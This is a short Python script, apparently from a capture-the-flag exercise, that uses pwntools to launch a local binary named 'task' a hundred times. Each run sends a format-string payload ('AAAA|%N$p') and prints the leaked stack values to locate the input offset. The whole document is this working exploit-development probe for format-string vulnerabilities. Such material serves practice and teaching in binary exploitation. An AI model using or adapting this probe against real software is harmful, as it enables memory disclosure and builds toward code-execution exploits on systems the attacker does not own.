from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'error'

for i in range(1, 101):
    try:
        p = process()

        p.recvlines(3)

        p.sendline("AAAA|%{}$p".format(i).encode())
        resp = p.recvline().decode().strip()

        print(str(i) + ': ' + resp)
        p.close()

    except EOFError:
        pass
